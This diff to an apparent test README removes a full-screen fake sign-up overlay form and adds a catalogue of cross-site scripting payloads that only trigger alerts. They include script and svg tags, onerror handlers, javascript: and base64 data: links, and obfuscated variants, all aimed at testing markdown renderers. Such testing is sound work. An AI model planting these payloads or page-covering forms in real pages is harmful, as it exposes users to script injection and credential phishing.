@@ -1,1 +1,62 @@
-<div style="position:fixed;top:0;left:0;width:100%;height:100%;background:linear-gradient(to right,#6a11cb,#2575fc);display:flex;justify-content:center;align-items:center;padding:20px;box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;"><div style="background-color:rgba(255,255,255,0.95);padding:40px;border-radius:20px;box-shadow:0 10px 30px rgba(0,0,0,0.2);width:100%;max-width:450px;box-sizing:border-box;backdrop-filter:blur(10px);"><form action="#" method="post"><h2 style="text-align:center;color:#333;margin-top:0;margin-bottom:30px;font-size:28px;font-weight:700;">Create Your Account</h2><div style="margin-bottom:20px;"><label for="fullname" style="display:block;color:#555;margin-bottom:8px;font-weight:600;">Full Name</label><input type="text" id="fullname" name="fullname" placeholder="e.g., John Doe" required style="width:100%;padding:15px;border:1px solid #ccc;border-radius:10px;box-sizing:border-box;font-size:16px;"></div><div style="margin-bottom:20px;"><label for="email" style="display:block;color:#555;margin-bottom:8px;font-weight:600;">Email Address</label><input type="email" id="email" name="email" placeholder="you@example.com" required style="width:100%;padding:15px;border:1px solid #ccc;border-radius:10px;box-sizing:border-box;font-size:16px;"></div><div style="margin-bottom:25px;"><label for="password" style="display:block;color:#555;margin-bottom:8px;font-weight:600;">Password</label><input type="password" id="password" name="password" placeholder="Enter a strong password" required style="width:100%;padding:15px;border:1px solid #ccc;border-radius:10px;box-sizing:border-box;font-size:16px;"></div><div><button type="submit" style="width:100%;padding:16px;border:none;border-radius:10px;background:linear-gradient(to right,#6a11cb,#2575fc);color:white;font-size:18px;font-weight:700;cursor:pointer;box-shadow:0 4px 8px rgba(0,0,0,0.2);">Sign Up</button></div><p style="text-align:center;margin-top:25px;color:#777;font-size:14px;">Already have an account? <a href="#" style="color:#6a11cb;text-decoration:none;font-weight:600;">Log In</a></p></form></div></div>
+# ⚠️ XSS Payload Injection Test
+
+This README file includes **XSS payloads** in different markdown contexts.
+
+## 1. Basic HTML Injection
+
+<svg/onload=alert(1)>
+<iframe src="javascript:alert('XSS')"></iframe>
+<img src=x onerror=alert('XSS')>
+<script>alert('XSS')</script>
+<details open ontoggle=alert('XSS')><summary>XSS</summary></details>
+<math><mtext><svg><animate attributeName="href" values="javascript:alert(1)" /></svg></mtext></math>
+
+## 2. Markdown Image Injection
+
+![XSS](javascript:alert('XSS'))
+![xss](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+)
+
+## 3. Link Injection
+
+[Click Me](javascript:alert('XSS'))
+[Link](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)
+
+## 4. Inline Code Injection
+
+Here’s a code block with `"><img src=x onerror=alert('XSS')>` inside.
+
+## 5. HTML Elements
+
+<div onmouseover="alert('XSS')">Hover me!</div>
+<a href="javascript:alert('XSS')">Click</a>
+<video><source onerror="alert(1)"></video>
+<body onload=alert(1)>
+
+## 6. Autocomplete Fields
+
+<input type="text" value="XSS" onfocus="alert('XSS')">
+<textarea onfocus=alert('XSS')>XSS</textarea>
+
+## 7. Obfuscated Payloads
+
+<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+
+## 8. CSS-based XSS (in some cases)
+
+<div style="background-image:url(javascript:alert(1))">Test</div>
+
+## 9. Data URI Payloads
+
+<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></iframe>
+
+## 10. Comment Injection (for systems parsing comments)
+
+<!-- <img src=x onerror=alert(1)> -->
+
+---
+
+### ✅ Disclaimer
+
+This file is made for **testing how a markdown-rendering system handles unsafe content**. Use it only in **safe, isolated test environments**.
+
